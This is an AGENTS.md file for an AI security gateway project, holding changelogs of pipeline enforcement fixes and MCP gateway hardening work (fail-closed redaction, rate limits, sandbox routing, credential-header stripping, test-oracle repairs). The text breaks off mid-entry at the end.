# AGENTS.md — AI Mesh Firewall

## Pipeline Consolidate + Fix + FREEZE changelog
- Cursor Ralph pipeline lane consolidates, fixes, and freezes the chat pipeline code paths.
  **Every pipeline change is logged to four memories in the SAME commit:** Ruflo
  (`memory store --namespace pipeline/changes`), this file (one-line pointer), Cursor
  (`.cursor/rules/pipeline-changelog.mdc`), and the canonical `docs/pipeline/CHANGELOG.md`
  (source of truth).
- Scratchpad: `.cursor/ralph/scratchpad.md` (P1–P9, one item/iteration).
- Changelog pointers (newest last):
  - PIPELINE-0001 (2026-07-03) — docs/pipeline/PATHS.md: complete code-path enumeration (4 sub-paths
    + firewall-disabled + responses-delegate), 6 fail-open sites documented.
  - PIPELINE-0002 (2026-07-03) — docs/pipeline/DIVERGENCES.md: divergence analysis across all paths.
    8 divergences (D-01–D-19); highest risk = D-05 (output guard fail-open exception Path B), D-06
    (streaming skips reasoning_content/tool_calls). Streaming vs non-streaming enforcement matrix.
    Cross-ref to the known input_scan BLOCK + model_output 7710ms leak.
 - PIPELINE-0003 (2026-07-03) — docs/pipeline/CANONICAL.md: ONE canonical pipeline, ONE enforcement
 authority. resolve_and_enforce() + enforce_output() → frozen PipelineDecision. Fail-closed
 (degraded→redact, exception→block). Fixes D-05/D-06/D-18. Migration: ~550 LOC inline → 1 call;
 proxy_chat ~4000→~2000. Mermaid diagram.
 - PIPELINE-0004 (2026-07-03) — enforcement.py + main.py: canonical enforcement authority
 IMPLEMENTED. PipelineDecision frozen dataclass + resolve_and_enforce() (input) +
 enforce_output() (output) in enforcement.py. Input enforcement block (~L6435-6691) wired
 to resolve_and_enforce(). D-05 FIX: _apply_output_guard_nonstream exception → fail-CLOSED
 block (was fail-open return None). 30 new tests. Gate: 151 targeted + 1824 full suite passed.
 - PIPELINE-0005 (2026-07-03) — BLOCK SHORT-CIRCUIT VERIFIED: 6 input-side block returns
 (threat_intel L5324, keyword L5983, backend_scan L6106, policy L6220, scanner L6603,
 unmaskable_PII L6745) ALL precede ALL model calls (L6802/6819 standalone, L7542/7560
 connected) across all 4 paths (A/B/C/D). Structural source proof (line-number invariant) +
 pipeline_trace model-skip verification (build_pipeline_trace blocked_stage=policy/input_scan →
 model_input/model_output action='skip'; output_guardrail → NOT 'skip') + enforcement authority
 terminal-block contract (injection/unmaskable-PII/org-policy → is_terminal_block; PII-maskable →
 redact not block; monitor mode → never terminal). 24 new tests in
 test_pipeline_block_shortcircuit.py. Gate: 24 targeted + 30 enforcement + 1851 full suite passed.
 - PIPELINE-0006 (2026-07-03) — DEGRADED SCANNER FAILS CLOSED: enforcement.py + main.py.
 tier2_degraded + PII/secrets/credentials detected in scan text → REDACT (or BLOCK if
 unmaskable), NEVER raw to model. Clean prompt under degraded → monitor only. Fixes D-02
 (Tier-2 degraded fail-open). tier1_pii_detected param + detect_pii/detect_secrets run at
 degraded path. Output enforce_output(scan_degraded) → redact confirmed wired. 19 new tests
 in test_pipeline_degraded_failclosed.py. Gate: 19 targeted + 54 enforcement + 1870 full
 suite passed.
 - PIPELINE-0007 (2026-07-03) — ONE authoritative final_action + blocked_by: main.py.
 _build_safe_block_response single-writer (no double-resolution); removed redundant
 pipeline_stage from 403 JSON. Trace final_action sourced from PipelineDecision (not ad-hoc).
 Streaming input_action param. No double-block. 20 tests + 1894 full suite passed.
 - PIPELINE-0008 (2026-07-03) — LEAK VERIFIED FIXED: PII never reaches model on block;
 original input_scan BLOCK + model_output 7710ms structurally impossible. 5 evidence
 dimensions: (1) is_terminal_block → short-circuit before ALL model calls; (2) redact_all
 byte-removes SSN+email+AWS key; (3) degraded+PII → redact/block never raw; (4)
 build_pipeline_trace blocked_stage → model_output=skip content=""; (5) LIVE Docker stack
 SSN+email+key → 403, model_input=skip, model_output=skip, 9.7ms (no 7710ms). 26 new tests
 in test_pipeline_leak_verification.py. Gate: 26 targeted + 1920 full suite passed.
 - PIPELINE-0009 (2026-07-03) — POLICY REDACTS PII/PCI/PHI BEFORE INPUT_SCAN (B-POL fix):
 main.py _policy_check_cached. When both redact+block rules co-match, evaluate() returns
 action="block" (MAX); redaction_hints were only applied when action=="redact" → silently
 discarded → hard block without masking PII. FIX: apply redaction FIRST, re-evaluate block
 rules on masked text; if no block rule still matches → downgrade to "redact" + return
 masked prompt (input_scan sees clean text). Compile+push path verified. 18 new tests in
 test_pipeline_policy_redact.py. Gate: 18 targeted + 1948 full suite passed.
 - PIPELINE-0010 (2026-07-03) — resolve_enforcement REDACT MAPPING FIXED (L5):
 enforcement.py resolve_enforcement monitor-posture downgrade. Two bugs: (1) when scanner
 rec=redact, policy=block, enforcement_mode!=block, the block→monitor downgrade LOST the
 data-protection redaction (resolve_enforcement returned "monitor"; resolve_and_enforce
 compensated via should_apply_redaction override but the atomic function violated its own
 contract). (2) unmaskable PII (redaction_possible=False) under non-block enforcement_mode
 was downgraded to "monitor" → the main.py honesty check at L6805 saw
 is_terminal_block=False and forwarded RAW unmaskable PII to the model. FIX: monitor-posture
 if-block now branches: rec=redact+possible → preserve "redact"; rec=redact+impossible →
 preserve "block" (fail-closed, overrides monitor); else → "monitor". Net: REDACT
 recommendation → REDACT under any posture when bytes can be masked; unmaskable PII
 always fails closed to BLOCK regardless of enforcement_mode. 17 new tests in
 test_enforcement.py. Gate: 28 targeted + 1965 full suite passed.
 - PIPELINE-0011 (2026-07-03) — TIER-1 FP FIXED (L3): plain-text PII with unrelated
 markup (**bold**, &#169;) no longer classified as "Markdown/HTML-obfuscated" (→ redact, not
 block). Root cause: G33/G53/G76 obfuscation detectors compared decoded-variant detections
 against "raw" detections using detect_*/detect_secrets, but those canonicalize internally
 (strip ZWC, fold fullwidth) → (a) plain SSN near **bold** wrongly obfuscated, (b) ZWC-
 interleaved credential wrongly filtered OUT. FIX: use _*_core variants (no canon) for the
 plain-text filter in scanner.py (G33+G53) + mcp_scan_orchestrator.py (G76). 17 new tests
 in test_pipeline_obfuscation_fp.py. Gate: 17 targeted + 2000 full suite passed.
 - PIPELINE-0015 (2026-07-03) — LATENCY RECONCILED (P5-15/L8): pipeline_trace fake stage
 defaults removed; skipped model_output latency forced 0 (was 11.6ms from processing_time_ms);
 total_latency_ms = sum(stages)+overhead_ms. PipelineStageTimer+finalize_stage_metrics;
 proxy_chat perf_counter per stage. 5 new tests. Gate: 2039 passed.
 - PIPELINE-0016 (2026-07-03) — FRONTEND LATENCY+TTFT (P5-16): UI Duration/total wired to
 pipeline_trace.total_latency_ms (not meta.latency_ms=0). resolveTotalLatencyMs/resolveTtftMs;
 LogDetailPage+liveGateway+charts; SSE terminal trace capture; stream trace frame reconciles
 total+ttft_ms; simulator TTFT label. Browser: Duration 13607.1ms not 0. 5 FE+1 GW tests.
 Gate: lint+build green. Evidence mcp-parallel/findings/pipeline-p16-frontend-latency-ttft/.
 - PIPELINE-0018 (2026-07-03) — LATENCY PARITY E2E (P5-18): backend pipeline_trace.total_latency_ms
  == UI Duration (header + Total Duration metric) within 0.1ms rounding. parsePipelineDurationMs +
  latencyMsWithinTolerance; Playwright gate pipeline_p18_latency_parity_verify.mjs; GW UI-format
  contract tests. Browser: event 295909 api/header/metric all 14860.9ms delta=0. 3 FE + 2 GW tests.
  Gate: 2055 GW + build green. Evidence mcp-parallel/findings/pipeline-p18-latency-parity/.
 - PIPELINE-0019 (2026-07-03) — BLOCKED-EVENT PIPELINE TRACE (P6-19/L9): input_blocked/output_guard
  telemetry omitted metadata.pipeline_trace (HTTP 403 had stages[] only). FIX: main.py
  _build_blocked_pipeline_trace + _REQUEST_PIPELINE_CTX + _enrich_blocked_event_pipeline_trace in
  _emit_telemetry; policy/check builds trace once for emit+response. Control tasks.py hoist unchanged.
  +4 tests test_pipeline_blocked_trace_telemetry.py. Gate: 2059 passed.
 - PIPELINE-0020 (2026-07-03) — PER-STAGE WHY TRANSPARENCY (P6-20): pipeline_trace stage objects
  enriched with matched_policies, matched_rules, guard_reason, tier, confidence, decision_source,
  prompt_in/prompt_out (redacted-safe) on ALL stages via STAGE_TRANSPARENCY_KEYS +
  normalize_stage_transparency(); build_pipeline_trace + blocked path inherit; StageTimeline/
  LogDetailPage render policy WHY + decision source labels. +5 tests
  test_pipeline_stage_transparency.py. Gate: 2064 GW + lint/build green.
 - PIPELINE-0021 (2026-07-03) — ROUTING DECISION TRANSPARENCY (P6-21): model_routing stage +
  trace root expose route_destination (LLM/RAG/Vector DB/MCP), requested/selected/routed model,
  routing_reason, decision_source, decision_factors[], weights{}, policy_summary, score,
  candidate_count; adjudicator metadata wired from main.py; LogDetailPage RoutingDecisionCard +
  StageTimeline routing fields; resolveRoutingDecision FE helper. +3 GW + 1 FE tests. Gate: 2067
  GW + lint/build green.
 - PIPELINE-0022 (2026-07-03) — TRACE-ROOT INPUT/OUTPUT (P6-22): pipeline_trace root adds
  final_action, input_text, prompt_submitted, output_text/final_response, output_withheld +
  output_withheld_reason, input_was_redacted + input_text_before/after (redacted-safe);
  main.py telemetry threads input_text/output_text; LogDetailPage Input/Output panels via
  resolvePipelineInputOutput (blocked withheld banner; redact before/after). +4 GW + 2 FE tests;
  pipeline_p22_input_output_verify.mjs. Gate: gateway + lint/build green.
 - PIPELINE-0023 (2026-07-03) — EVENT CONFLATION FIX (P6-23/L10): proxy_chat honoured client
  X-Request-ID as canonical request_id → concurrent pinned-header calls collided and threat-feed
  sibling merge mixed prompts. FIX: _bind_gateway_request_id mints fresh zs-* per request (client
  header → client_correlation_id only); _stamp_pipeline_trace_request_id; telemetry request_id +
  pipeline_request_id; control _pipeline_io_fingerprint mismatch guard on sibling merge;
  LogDetailPage trace-scoped I/O (no prompt_lineage bleed). +5 tests
  test_pipeline_request_id_conflation.py. Gate: 2076 GW passed.
- PIPELINE-0017 (2026-07-03) — LATENCY BREAKDOWN+HINTS (P5-17): pipeline_trace.latency_breakdown
 (dominant stage/share, by_stage, hints[]) via build_latency_breakdown+attach_latency_breakdown;
 stream frame recomputes after total reconcile. FE LogDetailPage breakdown table + "How to reduce
 latency" cards; pipelineTrace resolveLatencyHints + legacy stage-sum fallback. 8 GW + 5 FE tests.
 Browser: 14860.9ms event → model_output hint visible. Gate: lint+build green. Evidence
 mcp-parallel/findings/pipeline-p17-latency-hints/.
 - PIPELINE-0014 (2026-07-03) — OUTPUT REDACT BYTE-VERIFIED (P4-14): enforce_output() maskable
 block→redact + redaction_possible noop→block; connected sync Path D + _apply_output_guard_nonstream
 wired through enforce_output(); sanitize byte-check fail-closed. 15 new tests. Gate: 2029 passed.
 - PIPELINE-0013 (2026-07-03) — OUTPUT GUARD MODEL-ONLY (L6/L7): normalize_output_scan_text +
 _model_output_scan_text treat whitespace-only as empty; inspect() allow on empty; sync_pre_llm
 guard-before-trace + output_scan_verdict; pipeline_trace output detail no input-echo fallback;
 streaming normalize before inspect. 12 tests. Gate: 2022 full suite.
 - PIPELINE-0012 (2026-07-03) — PRE-MASKED SMART-MASK PII REDACTS (not block): G53 stripped `***`
 from partial masks (j***@a***.com→j@a.com) → false obfuscated_pii BLOCK; B1 noop guard blocked
 already-masked bytes; scan_block_on_pii=false downgraded redact→allow. FIX: smart-mask PII
 patterns, {1,2} emphasis cap, G53 skip, B1 noop exemption, redact eligibility + pipeline_trace
 input_scan=redact on intentional noop. LIVE input_scan REDACT + masked prompt forwarded. 7 new
 tests. Gate: 2009 full suite. Evidence: mcp-parallel/findings/pipeline-p12-live-proof.json.

## MCP Hardening BACKSTOP changelog
- Parallel Claude + Cursor sessions harden the multi-tenant MCP gateway. **Every hardening change is
  logged to four memories in the SAME commit:** Ruflo (`mcp__ruflo__memory_store`
  namespace=`mcp-hardening/changes` + `hooks_notify`), this file (one-line pointer), Cursor
  (`.cursor/rules/mcp-hardening-changelog.mdc`), and the canonical `docs/mcp/HARDENING_CHANGELOG.md`
  (source of truth; §0 = protocol + entry template).
- Backstop work-list: `scripts/ralph/mcp_hardening_scratchpad.md` (G0–G7, one item/iteration).
- Shared index: stage narrowly, commit immediately, never `git add -A`; rebase from `main` often.
- Changelog pointers (newest last):
  - CHG-0001 (2026-07-02) — established the four-memory changelog protocol; audited runsc fail-closed
    enforcement in `docker_manager._resolve_runtime()`.
  - CHG-0002 (2026-07-02) — backstop audit → `docs/mcp/BACKSTOP_FINDINGS.md` (24 findings; next priority =
    G2 item 2 fail-closed byte-verified result redaction). Confirmed SSE egress unscanned, per-actor authz
    missing on stdio/ws, tags audit-only, gVisor/egress default fail-open, a dead cross-tenant oracle +
    15-sandbox ceiling overstating prior "scale validated" claims.
  - CHG-0003 (2026-07-02) — G2 item 2 (partial): `_scan_tool_result_floor` now fails CLOSED on result-scan
    error (was fail-OPEN, forwarding raw RESULTS). +2 byte-level tests; 323 passed. Remaining: SSE
    buffer-and-scan, string/structuredContent shapes, main-path inline audit.
  - CHG-0004 (2026-07-02) — G2 item 2 (closes HIGH SSE leak): `ext_mcp_proxy` now buffers+scans finite
    tools/call SSE results (`_scan_reframe_sse_tool_result`), re-emits masked or blocks; non-tools/call SSE
    passes through. 12 + 342 tests pass; aidefence oracle confirms clean egress. Remaining: string/
    structuredContent shapes, main-path inline audit.
  - CHG-0005 (2026-07-02) — CLOSES G2 item 2: ext-proxy (non-streaming + SSE) scans the WHOLE `result`
    (content/structuredContent/list/str), not just `result.content`. Main `org_mcp_jsonrpc` audited
    fail-SAFE (scan error → 500, raw only after successful scan), not fail-open. 14 + 362 tests pass.
    Item 2 DONE (fail-closed bare / fail-safe main, byte+oracle verified). Next: G2 item 3 per-actor authz.
  - CHG-0006 (2026-07-02) — G2 item 3 (finding #2): `org_mcp_tool_call` REST route now enforces the three
    per-key gates (allowlist 403 / call-cap 429 / disabled 403) before forwarding, at parity with
    `org_mcp_jsonrpc`. +4 tests; 18 + 424 pass. Remaining item 3: per-actor authz + field RBAC on stdio/ws
    adapter path (finding #1); posture-vs-rule block downgrade (#3); allowlist-scope inversion (#4).
  - CHG-0007 (2026-07-02) — G2 item 3 (#3 fixed, #4 dismissed): Tier-1 policy scan honors a rule's own
    `action='block'` under any non-monitor posture (was downgraded to tag; adapter path bypasses the backend
    — parity with control-plane engine). **#4 FALSE POSITIVE** — `_policy_applies_to_actor` is correct
    policy-SCOPING (mirrors control plane); do NOT invert it. +2 tests; 15 + 427 pass. Remaining item 3:
    finding #1 (per-actor authz + field RBAC on stdio/ws adapter path).
  - CHG-0008 (2026-07-02) — G2 item 3 AUTHZ DONE (finding #1 CORRECTED): per-actor ACCESS authz
    (block/allow by user/agent/role) IS enforced on the stdio/ws adapter path via `evaluate_mcp_policies(actor)`
    + `_policy_applies_to_actor` (+CHG-0007) — the audit's "no access decision on adapter path" was
    imprecise. Added end-to-end proof (27 pass). SPLIT-OUT item 3b: per-policy FIELD-level redaction
    (`redaction_fields`) is HTTP-only; needs a gateway bundle-format extension.
  - CHG-0009 (2026-07-02) — G5 item 19 (oracle fixed): the cross-tenant leakage oracle in
    `scripts/mcp_scale_matrix_live.py` was FABRICATED (`for fs in []` → always 0, and not gated). Replaced
    with a real unit-tested `count_foreign_events`, added to the PASS gate, import-safe; new
    `scripts/test_mcp_scale_oracle.py` (5 pass). Remaining: run the canary matrix LIVE at 500-sandbox scale
    with real egress + aidefence cross-check (tied to item 14).
  - CHG-0010 (2026-07-02) — G5 item 14 (code ceiling removed): scale provisioner org count was hardcoded
    3-tuple (→15-sandbox ceiling); now `build_orgs(NUM_ORGS)` (default 3), so `NUM_ORGS=50 SERVERS_PER_ORG=10`
    → 500 targets. New `scripts/test_mcp_scale_provision.py` (4 pass). Remaining: pre-create N orgs; broker
    per-org distinct UID (fork budget); prove 300-500 healthy live.
  - CHG-0011 (2026-07-02) — VERIFICATION (docs only): G3 item 7 is broker-complete but gateway-wiring
    INCOMPLETE — corrects the "all 32 complete / all transports via sandbox" claim. stdio→broker ✓;
    http/sse→control backend (calls upstream directly, no broker); ws→in-gateway. So http/sse/ws don't
    egress via the per-org sandbox. NOT a data leak (result scan applies per CHG-0005) — isolation gap.
    Owning session: route http/sse + ws through `broker_send_rpc` (unified `/{org}/rpc` route ready).
  - CHG-0012 (2026-07-02) — G5 item 20 harness upgrade: `mcp_live_matrix_harness.py` was sequential + never
    checked response bytes (redact-but-forward counted as allowed). Now concurrent (CONCURRENCY semaphore) +
    asserts RESPONSE BYTES via `find_leaked_values` (raw sent value in egress = leak → FAIL). New
    `scripts/test_mcp_live_matrix_oracle.py` (5 pass). Remaining: run LIVE at peak load 3×, zero leaks.
  - CHG-0013 (2026-07-02) — G5 item 19 LIVE isolation VERIFIED: stack up → RAN scale-matrix 3× consecutive
    (540 calls): cross_org_result_leak=0, foreign_org_events_total=0, errors=0, mismatches=0. De-flaked the
    gate (retry-on-mismatch; the ~0.7% transient echo hiccup was flakiness, not a demux/isolation bug).
    Evidence in mcp-parallel/findings/backstop-p19-isolation/. Remaining: 500-sandbox-under-chaos scale.
  - CHG-0014 (2026-07-02) — G5 item 20 LIVE redaction-under-load VERIFIED: ran live-matrix 3× consecutive
    (CONCURRENCY=25, 450 calls): total_leaked=0, redacted=60/run, errors=0 — 1.4 redaction holds under
    concurrency (validates CHG-0003/0004/0005 + CHG-0012 end-to-end). Fixes: PII in `message` (round-trips
    through echo), resilient CONTROL_URL lookup. Evidence mcp-parallel/findings/backstop-p20-redaction-load/.
  - CHG-0015 (2026-07-02) — LIVE architecture posture (docker inspect): item 10 resource limits VERIFIED
    STRONG (cap_drop=ALL, no-new-priv, pids=256, mem=2GiB, cpu=1, readonly-rootfs, noexec-tmpfs); per-org
    network isolation VERIFIED (distinct mcp_sandbox_net_<org>). item 12 gVisor UNMET INFRA PREREQ
    (runsc NOT installed — can't require here); egress GAP confirmed (networks internal=false). Evidence
    mcp-parallel/findings/backstop-p12-isolation-posture/.
  - CHG-0016 (2026-07-02) — G3 item 9 LIVE gateway auth/authz VERIFIED: no-auth/bad-key→401, CROSS-ORG
    key→403 org_scope_violation (both directions = auth-layer cross-tenant isolation), bad input→graceful
    (no 500). Rate-limit exists (S12) but not tripped at 60 calls. Evidence
    mcp-parallel/findings/backstop-p9-gateway-authz/. Remaining: rate-limit threshold + adversarial policy/audit.
  - CHG-0017 (2026-07-02) — G2 item 5 LIVE compliance-tagging verified; narrowed to vocabulary-only gap.
    Redaction comprehensive (ssn/card/email masked, 0 leak); tags recorded+complete (email+ssn →
    ['GDPR','HIPAA','PII']); decision=redact under tag posture. ONLY gap: gateway codes ≠ catalog codes so
    MCPEvent.compliance_tags joins 0 catalog rows. Fix = unify vocab (cross-plane) — owning session.
    Evidence mcp-parallel/findings/backstop-p5-compliance-tags/.
  - CHG-0018 (2026-07-02) — RE-VERIFY G3 item 7: my CHG-0011 http/sse-in-backend finding RESOLVED by
    P4.13/P6.18 (gateway routes stdio + streamable-http/sse via sandbox `broker_send_rpc`, never dials
    upstream; MCP_HTTP_VIA_SANDBOX=true live). RESIDUAL: websocket still in-gateway (mcp_ws_adapter.py:135),
    so "4-transport" overstates (3/4; ws unused live). Remaining: migrate ws to broker or mark ws legacy.
  - CHG-0019 (2026-07-02) — item 21 (frontend): fixed a BROKEN mojibake fix at PolicyManagementPanel.jsx:399
    (literal `·` in raw JSX text rendered the string, not `·`); now `{'·'}`. npm run build ✓.
  - CHG-0020 (2026-07-02) — G4 item 13 LIVE observability: metrics + health + auto-recovery (docker
    healthchecks + reaper) WIRED. GAPS: distributed tracing (OTEL) not configured; gateway has no docker
    healthcheck; backup unverified. Evidence mcp-parallel/findings/backstop-p13-observability/.
  - CHG-0021 (2026-07-02) — G2 items 4 & 6 RESOLVED: LIVE per-call chain verified in order (authz → minimize
    [N-A for MCP] → scan+redact [scan_trace tier1 in→out, decision=redact] → tag [GDPR,HIPAA,PII] → audit).
    item 4 minimize = N-A (gateway forwards only tool args; minimize_context is chat-only). Only G2 open: 3b
    (field RBAC) + 5 (vocab). Evidence mcp-parallel/findings/backstop-p6-per-call-chain/.
  - CHG-0022 (2026-07-02) — G3 item 8: `docker_manager._run_kwargs` now propagates the npm pin/allowlist
    env (MCP_STDIO_REQUIRE_PINNED_PACKAGES/PACKAGE_ALLOWLIST) into the sandbox (default OFF pass-through) so
    the agent's enforcement is reachable; was unreachable (defaulted OFF). +1 broker test; 27 passed.
    Remaining: enable in prod (pin all servers) + locked .npmrc/registry in sandbox image.
  - CHG-0023 (2026-07-02) — G3 item 11 LIVE PG+Redis correctness: Redis usage correct (scan_ver 72 keys
    M-15 cache-invalidation; ratelimit 2 keys S12; toolcalls mechanism present); PG persistence correct at
    scale (109,362 MCPEvents/3 orgs; compliance_tags populated). Restart-safety graceful by design; actual
    restart-drill = item-18 chaos (unsafe on shared stack). Evidence mcp-parallel/findings/backstop-p11-pg-redis/.
  - CHG-0024 (2026-07-02) — G2 item 3b: per-policy FIELD-level RBAC redaction on the stdio/websocket ADAPTER
    path. Gateway now consumes each matched actor-scoped policy's `redaction_fields` (emitted into the bundle
    by M-04, compiler.py:521) — `EvaluationResult.redaction_fields` + a Django-free port of control's
    `apply_field_redaction` (NFKC/case-insensitive keys, bounded, non-mutating) mask the named tool-RESULT
    fields on the OUTPUT payload, scoped by actor, output-only, suppressed under `monitor`, audited via
    `redacted_fields`. Closes finding #1 (field-RBAC absent on adapter path; HTTP path already masked). Files
    policy_engine.py + mcp_scan_orchestrator.py + mcp_proxy.py + test_mcp_scan_orchestrator.py (+7 tests, 22
    passed, 1056 broad sweep). Backward-compat: redaction_fields=[] → no-op. REMAINING: cross-stage
    (input-triggered) parity + live drive → item 3b stays open (advanced).
  - CHG-0025 (2026-07-02) — G2 item 3b COMPLETE ([x]): cross-stage input-triggered field projection. The RBAC
    "role X never sees field F" pattern authors the rule on the CALL, so the INPUT-stage policy match must
    project fields out of the RESPONSE (control HTTP-path parity). Gateway now: input scan surfaces
    `policy_redaction_fields` in meta; `org_mcp_jsonrpc` threads `_in_rfields` into both adapter OUTPUT scans
    as `extra_redaction_fields`; `apply_field_redaction` returns identity on a no-op; the adapter swap gate
    also fires on `redacted_fields` so a finding-less projection isn't discarded. Files policy_engine.py +
    mcp_scan_orchestrator.py + mcp_proxy.py + test_mcp_scan_orchestrator.py (+5) + test_e12_result_redaction.py
    (+2 end-to-end). Gate: 37 relevant + 1063 broad sweep passed. Both trigger directions (output-content +
    input-call) now covered on the adapter path. RESIDUAL (non-blocking): bare-REST cross-stage + optional
    live drive.
  - CHG-0026 (2026-07-02) — G3 item 7 [x]: migrated the websocket transport onto the sandbox broker path.
    `_adapter_forward` now routes ws via `broker_send_rpc` (transport='websocket') alongside streamable-http/
    sse; the in-gateway `mcp_ws_adapter.send_jsonrpc` dial is removed. ws was the last transport still opening
    an upstream socket from inside the gateway process, despite `_is_sandbox_routed` already declaring it
    sandbox-routed and the broker/agent already supporting ws upstreams. Now ALL four transports (stdio +
    streamable-http + sse + websocket) egress via the per-org sandbox by default — gateway never dials
    upstream. Files mcp_proxy.py + test_mcp_http_via_sandbox.py (+1: asserts broker routing + in-gateway ws
    NOT dialed). Gate: 1064 gateway + 52 broker (ws/upstream/route/rpc/lifecycle) passed. Caveat: http/sse
    still honor MCP_HTTP_VIA_SANDBOX (default ON); stdio+ws unconditional. mcp_ws_adapter now legacy (benign
    main.py reaper/shutdown no-ops remain).
  - CHG-0027 (2026-07-02) — G4 item 13 (partial): added a docker healthcheck + restart to the gateway service
    (the ONLY core service with neither; CHG-0020 flagged health=none → never auto-restarted). Probes the
    auth-exempt /health (200 ok / 503 on signing misconfig) on both docker-compose.yml (base: healthcheck +
    restart: unless-stopped) and docker-compose.prod.yml (prod: healthcheck; restart via anchor). Config-only
    (running container NOT recreated). VERIFY: `docker compose ... config` renders gateway.healthcheck +
    restart=unless-stopped; both merged configs parse. Item 13 STILL OPEN: OTEL tracing + PG/Redis backup
    remain; optional peer service_healthy upgrade.
  - CHG-0028 (2026-07-02) — G5 item 20 (advance): extended mcp_live_matrix_harness.py with a per-actor
    AUTHZ-under-load oracle. The harness proved REDACTION under load but had no authz dimension. Added
    authz_denied() (403 / authz-error / [BLOCKED] result; a generic error is NOT a denial) + authz_violation()
    (True only when a forbidden tool EXECUTED successfully under load) + a Scenario type + a DENY_TOOL_NAME-
    gated F_authz_deny concurrent agent; the gate now FAILS on any authz violation and flags a vacuous deny
    run. Files scripts/mcp_live_matrix_harness.py + scripts/test_mcp_live_matrix_oracle.py (+3 oracle tests →
    8 passed). Backward-compat: unset DENY_TOOL_NAME → 5-agent redaction matrix unchanged. REMAINING: live
    peak run (5k-10k, item 15) with a real denied tool + tag-enforcement MCPEvent audit under load.
  - CHG-0029 (2026-07-02) — G5 harness quality: hardened the mcp_pipeline_matrix_live.py oracle. It was
    leak-blind (pii = _SSN in text — ONE hardcoded SSN in ONLY result.content[0].text, so a redact-but-forward
    in a later content item / structuredContent / nested field / any non-SSN value passed as redacted) and
    import-unsafe (KEY/argv/asyncio.run at module scope). Now find_pii_in_body() scans the FULL serialized
    response for the case's ACTUAL sensitive values (case_sensitive_values: explicit case['pii'] or SSN
    fallback); redacted = allow + no raw value anywhere + a marker (byte-truth); module import-safe. +8 unit
    tests (scripts/test_mcp_pipeline_oracle.py); all 4 scripts oracle suites → 25 passed. Same class of fix as
    CHG-0009 (dead oracle) + CHG-0012 (no byte-check).
  - CHG-0030 (2026-07-02) — 1.4 "PII/IP/regulated": extended MCP compliance tagging to IP/infrastructure
    leakage. detect_ip_leakage + IP_LEAKAGE_PATTERNS (internal IPv4/hostname/URL + private file paths → INFRA)
    already ran on the chat output_guard but the MCP scan (_scan_text_tier1) ran ONLY detect_pii/detect_secrets
    — so an internal host/IP/path in a tool RESULT was never detected/tagged/redacted. Now folded in: an
    ip_leakage finding is INFRA-tagged (via get_compliance_tags) + enforced by posture (block→block,
    redact→redact_all, monitor→tag). Fail-closed byte-check: redact_all masks internal IP/host/URL but NOT file
    paths, so if a detected internal value survives the scrub under redact it BLOCKS (no redact-that-leaks).
    Public IPs not flagged. Files mcp_scan_orchestrator.py + test_mcp_scan_orchestrator.py (+5). Gate: 32 +
    1069 broad sweep passed. (Distinct from item 5's tag-vocab mismatch, still open.)
  - CHG-0031 (2026-07-02) — G3 item 9 (gateway rate-limit parity): the bare REST route org_mcp_tool_call
    enforced the per-KEY tool-call cap but NOT the per-ORG TPM/burst/RPM rate limit that org_mcp_jsonrpc
    applies — a tenant could exceed org ceilings via /tools/call. Extracted _mcp_org_rate_limit_raw (plain 429);
    the JSON-RPC route wraps it (unchanged), the bare route returns it as-is. Files mcp_proxy.py +
    test_mcp_rate_limit.py (+3). Gate: 7 rate-limit + 1072 broad sweep passed. Same bare-route parity class as
    CHG-0006. REMAINING (item 9): live threshold probe + adversarial policy + audit-completeness; ext_mcp_proxy
    also lacks the per-org limiter (follow-up if tenant-exposed).
  - CHG-0032 (2026-07-02) — G3 item 9: closed the ext_mcp_proxy rate-limit follow-up. The authenticated
    external MCP proxy (/v1/mcp/ext-proxy/{host}/{path}, behind auth middleware, NOT in EXCLUDED_PATHS) had
    inbound credential + SSE result scanning but NO per-org rate limit — a tenant could drive it past org
    ceilings. Added _mcp_org_rate_limit_raw(_get_auth_context(request)) after the domain allowlist check
    (plain 429 before scan/forward). Now ALL THREE tenant-facing MCP entry points (org_mcp_jsonrpc,
    org_mcp_tool_call, ext_mcp_proxy) enforce the per-org TPM/burst/RPM ceiling. Files mcp_proxy.py +
    test_mcp_rate_limit.py (+3). Gate: 10 rate-limit + 1075 broad sweep passed. Code-level rate-limit coverage
    complete; item 9 REMAINING: live threshold probe + adversarial policy + audit-completeness.
  - CHG-0033 (2026-07-02, HIGH) — 1.4 least-privilege/credential leak: ext_mcp_proxy forwarded the caller's
    request headers verbatim (only host/content-length/transfer-encoding stripped) to the third-party external
    MCP server — so the caller's Authorization: Bearer <gateway-API-key>, Cookie, and X-Api-Key egressed to the
    external domain (replayable against the gateway). The sandbox path already built a clean header set. Fix:
    new _ext_proxy_forward_headers strips hop-by-hop + credential/identity headers (authorization/cookie/
    x-api-key/x-gateway-*) and injects ONLY the upstream's own stored OAuth token (if any) as Authorization.
    Files mcp_proxy.py + test_mcp_bare_proxy_scan.py (+2). Gate: 20 bare-proxy + 1077 broad sweep passed.
  - CHG-0034 (2026-07-02) — G3 item 9 (gateway validation/DoS): the MCP routes buffered the whole body
    (request.body()/json()) with NO size ceiling (RAG/embeddings already 413-guard). Added _MCP_MAX_BODY_BYTES
    (default 10MiB, env MCP_MAX_BODY_BYTES) + _mcp_body_too_large() → 413 mcp_body_too_large on an oversized
    Content-Length, BEFORE buffering, on org_mcp_jsonrpc + org_mcp_tool_call + ext_mcp_proxy. Non-invasive
    (Content-Length pre-check, body-read flow untouched). Files mcp_proxy.py + test_mcp_rate_limit.py (+4).
    Gate: 14 + 1081 broad sweep passed. Documented limitation: doesn't catch chunked-without-Content-Length
    (infra body limit covers it; app-layer streaming cap deferred to avoid test-harness churn).
  - CHG-0035 (2026-07-02, verification) — read-only audit triggered by CHG-0033: checked the sibling
    security-critical egress/isolation paths for the same leak class. All CLEAN. Sandbox agent HTTP:
    follow_redirects=False + no verify=False anywhere (TLS verify default-on) + timeouts. WS: ws/wss only,
    default verifying SSL context. Container (docker_manager): no-new-privileges + DEFAULT seccomp (not
    unconfined) + cap_drop=ALL + read_only rootfs + memswap_limit=mem (swap off) + pids/mem/cpu limits.
    Multi-org cross-tenant harness: byte-level canary oracle + fail-closed negative matrix. Evidence
    mcp-parallel/findings/backstop-p12b-sandbox-egress-hygiene/audit.md. No code changed. RESIDUAL (item 12):
    runc (not gVisor) + open per-org NAT — infra, not code.
  - CHG-0036 (2026-07-02, FINDING) — G6 item 21: the MCP guardrail UI does NOT reflect 1.4 compliance tags,
    correcting fe-harden's "item 11 DONE". MCPGuardrailSimulator.jsx verdict never captures/renders
